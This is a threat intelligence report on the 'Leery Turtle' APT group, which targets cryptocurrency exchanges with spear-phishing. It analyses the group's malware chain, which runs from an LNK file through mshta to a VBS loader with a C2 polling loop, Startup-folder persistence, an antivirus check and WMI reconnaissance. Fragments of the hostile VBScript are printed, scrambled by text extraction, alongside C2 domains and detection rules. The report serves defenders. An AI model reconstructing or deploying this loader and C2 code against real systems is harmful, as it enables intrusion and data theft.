TLP : AMBERLeery Turtle Threat ReportReport Date: 6 May 2020 Report No: 20CTI212TABLE OF CONTENTI.THREAT GROUP SUMMARY Introducing the Leery Turtle APT Group Targets and CapabilitiesII. TECHNICAL ANALYSIS OF KEY ATTACKSActivity SummaryIII. DETECTION AND MITIGATION IV. APPENDIX V. CONTACTTLP : AMBER3 14TLP : AMBERI.THREAT GROUP SUMMARYGroup NameThreat ClassTarget IndustryMotivationAttack ScopeFavorite MethodActive SinceLeery TurtleAdvanced Persistent ThreatCryptocurrency Exchange BusinessFinancial GainGlobalSpearphishing, Malware InfectionLate 2017Introducing the Leery Turtle APT GroupLeery Turtle is a threat group which is active since at least late 2017. They are targeting Cryptocurrency Exchange companies globally. They continuously carry out spear-phishing campaigns to infect their targets with custom written malware. The forensic analysis concludes that this group is systematically operated, persistent, and funded.Targets and CapabilitiesAll of the campaigns observed were directed towards Cryptocurrency Exchange companies. Leery Turtle does not focus on any particular region, and target businesses worldwide. they mostly target technical and executive roles.In their operations, Leery Turtle employs extensive reconnaissance tactics. To specify vulnerable entry points, they send decoy e-mails with non-malicious attachments and monitor which of their targets tend to open and download them. The evidence also suggests that Leery Turtle selects and proﬁles their targets at an advanced level to the details of their private life.Attacks imitate commonly used ﬁle storage services like Google Drive, Microsoft OneDrive etc. This mimicking behavior also observed in their choice of domains. They also use e-mail spooﬁng techniques to make the e- mails appear as coming from a coworker.TLP : AMBERImage 1 - Example phishing e-mail imita2ng Google DriveII. TECHNICAL ANALYSIS OF KEY ATTACKSActivity SummarySteps of an attack are like the following:1. A password-protected PDF ﬁle is sent alongside an LNK shortcut that imitates a text ﬁle containing the pdf’s2. When double-clicked the shortcut ﬁle sends an HTTP request to a remote server through Windows utilitymshta.exe. This request is intended to download and execute the ﬁrst stage payload.3. The attacker’s web server responds with a VBS payload which will be executed. Additional controls on theserver-side are present. For example, we have observed that the server is checking if the user agent string is matching with MSHTA.4. We observed that the webserver is always running on TCP 8080. 5. The ﬁrst stage payload gathers information about the infected system and sends them to the command andpassword.control server.6. CNC server responds with a Second Stage VBS payload, which will be saved under the %TEMP% directory. 7. Malware creates a shortcut ﬁle named ‘xBoxOne.lnk’ under the Startup directory as a means of persistence.TLP : AMBERMALWARE ANALYSISLNK Shortcut File - Password.txt.lnkInitial LNK ﬁle is a simple shortcut that downloads & executes VBS code from a remote server using Microsoft’s system utility MSHTA. It is observed that attackers use the URL shortening service “bit.ly” at every stage of the operation.File Dropping and Persistency - First Stage DownloaderIt can be seen that malware is dropping ﬁles in the below code snippet. The malware contains a Base64 encoded code which then gets decoded and dropped under %Temp% directory with .vbs extension. After that, it creates another shortcut ﬁle under the Startup directory as a means of persistence.TLP : AMBERucr="url" GVlcCAxODAqMTAwMA0KCWxvb3ANCmVuZCBpZg0K"set fob=CreateObject("Scripting.FileSystemObject") flp=fob.GetSpecialFolder(2)&"\"&"Xbox"&".l"&"nk"Set tcl=wish.CreateShortcut(flp) tcl.TargetPath="msh"&"ta"pf=fob.GetSpecialFolder(2)&"\mfesf.vbs" set btf=fob.OpenTextFile(pf,2,true)tcl.Arguments=ucr … btf.Write dbsc(ln) btf.Close()Base64 Decoded VBS Code - First Stage DownloaderThis code snippet sends POST requests to CnC at regular intervals to receive commands to be executed.TLP : AMBERon error resume next randomize if WScript.Arguments.Length>0 then end ifHTP="ht" uu=HTP&"tp:"&"//"&WScript.Arguments.Item(0) cob="WinHttp" cob=cob&"Request." cob="WinHttp"&"."&cob cob=cob&"5.1" set whr=CreateObject(cob) do while true tpc=uu&"?"&"top"&"ic="&"s"&Int(1000*rnd+9000) whr.Open ps&"ST",tpc,false whr.Send tw&"00" if whr.Status=200 Then if rtc<>"" then WScript.Sleep 180*1000 looprtc=whr.ResponseTextExecute(rtc) exit doChecking for Security Products - First Stage DownloaderMalware enumerates the list of processes by interacting with WMI. After that, it checks for the presence of several Antivirus products. In case Qihoo360 Total Security, a Chinese AV product, is present then it deletes the shortcut under Startup which it created a while back. Therefore malware does not persist on the system if this security product is present.TLP : AMBERset wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\. \root\cimv2") set pl=wmi.ExecQuery("Select * from "&"Win32_Process")for each pi in pl nexttpl=tpl&LCase(pi.Name)&"|"ex="ws"if Instr(tpl,"kwsp"&"rot")>0 or Instr(tpl,"nppr"&"ot")>0 then edit" ln2=" & move """&flp&""" """& wish.SpecialFolders("startup") &"\"""ln2=" & del """&flp&""""if Instr(tpl,"hudo"&"ngf")>0 or Instr(tpl,"qhs"&"afe")>0 then end iftcl.Savewish.run "CM"&"D.E"&"XE "&"/c " & ln&" 1" & " & " & ln&" 2" & ln2,0,falseInformation Gathering Through WMI – Second Stage MalwareThe malware gathers plenty of information about the local system through WMI. It is observed that this information is later sent to the CnC server by the malware.TLP : AMBERset adapItems=ObjWMI.ExecQuery("SELECT * FROMWin32_NetworkAdapterConfiguration",,48)getInfo=getInfo+" MACon error resume next if isNull(adapter.IPAddress) then elsegetInfo=getInfo+"Networkfor each adapter in adapItemsAdapter:"+tab&adapter.Description+ent Address:"+tab&adapter.MACAddress + ent getInfo=getInfo+" IP Address:"+tab+Join(adapter.IPAddress, ",") + ent getInfo=getInfo+" Subnet Mask:"+tab+Join(adapter.IPSubnet, ",") + ent getInfo=getInfo+" Default Gateway:"+tab+Join(adapter.DefaultIPGateway, ",")+ ent Servers:"+tab&adapter.DHCPServer + ent Server:"+tab+Join(adapter.DNSServerSearchOrder, ",") + entif adapter.DHCPEnabled=true thenend if getInfo=getInfo+" DNSgetInfo=getInfo+" DHCPnextend ifData sent to CnCTLP : AMBER12/3/2019 6:51:57 AMMicrosoft Windows 7 Professional 32-bitCurrent Time: Username: USER-PC\admin Hostname: USER-PC OS Name: OS Version: 6.1.7601 Install Date: Boot Time: 12/3/2019 5:48:54 AM Time Zone: (UTC 0 hours) GMT Standard Time CPU: Path: C:\Users\admin\AppData\Local\Temp\mfesf.vbsIntel(R) Core(TM) i5-6400 CPU @ 2.70GHz (x64)10/05/2017Network Adapter: Intel(R) PRO/1000 MT Network Connection MAC Address:52:54:00:4A:04:AFIP Address: NOTEPAD.EXE C:3696 1 "C:\Windows\System32\cmd.exe" /C "ECHO huobi>C: \Users\admin\AppData\Local\Temp\Password.txt&NOTEPAD.EXE C: \Users\admin\AppData\Local\Temp\Password.txt&DEL C: \Users\admin\AppData\Local\Temp\Password.txt" \Users\admin\AppData\Local\Temp\Password.txt 1096 1 wscript "C:\Users\admin\AppData\Local\Temp\mfesf.vbs"wscript "C:\Users\admin\AppData\Local\Temp\mfesf.vbs"TLP : AMBERCommand and Control Communication – Second Stage MalwareIt is observed that malware has two different communication methods to receive commands. The ﬁrst method is simply receiving commands in Base64 encoded format. CNC responses beginning with “23#” are using this method.The second one is a bit more complicated. This time malware will receive a second URL from the CNC. Then it will send a GET request to this URL. The second server will respond with an encrypted payload and decryption key. We believe that this mechanism is meant to be a more resilient commanding system. CNC responses beginning with “20#” are using this method. 1. Simple Communication Method2. Dead-Drop Communication MethodTACTICS, TECHNIQUES & PROCEDURES Techniques and Tactics used by this threat are mapped according to the MITRE ATT&CK framework below.TLP : AMBERInitial AccessExecutionStartup FolderFile DeletionDiscoveryCommand ControlSpearphishing (T1192)Mshta (T1170)Setup Folder (T1060)File Deletion (T1107)Process Discovery (T1047)Standard Application Layer Protocol (T1071)Data Obfuscation (T1001)System Information Discovery (T1082)Network Conﬁguration Discovery (T1016)Data Encoding (T1131)III. DETECTION AND MITIGATIONStagePersistencyCNC DomainCNC TrafﬁcShortcut FileDropperDetectionShortcut ﬁle named ‘xBoxOne.Ink’ is preset under Startup folderDNS request contains two or more of there; googl, drive, cloud, share, uploadThe destination port is 8080 and trafﬁc contains one of these; 20#, 23#, VBScriptLNK target starts with mshta url with .vbs extension is created under Temp folderTLP : AMBERIV. APPENDIXdrive.googleupload.infosupport.gdrvcheck.cogdocs.googleupload.infomicrosoft-update10v.amazonaws1.info_jﬁeo2_se.drivegooglshare.xyzdocs.gdriveshare.topdocs.googleﬁledrive.comdownload.gdriveupload.sitedrivegoogle.publicvm.comﬁle.onedrivecloud.storeiellsﬁleshare.sharedrivegght.xyzmail.gmaildrive.siteservice.amzonnews.clubupdate.gdrives.topverify.googleauth.prowww.msupdatepms.xyzdrivelnk.liveonedrvshare.xyzscloud.wechart.orgcheck.onedrvdn.co092jb_378v3_1.googldocs.org att.gdrvupload.xyzclient.googleapis.onlinedown.ﬁnancialmarketing.livedrive.gogleshare.xyzdrives.googlecloud.livegbackup.gogleshare.xyzmail.gdriveupload.infomail.googleupload.infostart.showprice.xyzupload.gdrives.bestNon-classiﬁedAddress R&D: Istanbul Teknik Üniversitesi Arı Teknokent Sarıyer/IstanbulTel: +90 850 885 2121V. CONTACTAddress HeadQuarter: Parnu Mnt 10, 10148 Tallinn, EstoniaAddress MEA (Bosphorus Chapter): DAP Yapı Z Oﬁs Plaza Kat 3 No 299 Kağıthane/IstanbulTel: +14156551677 info@cyberstruggle.org url +90 850 885 2121Non-classiﬁed 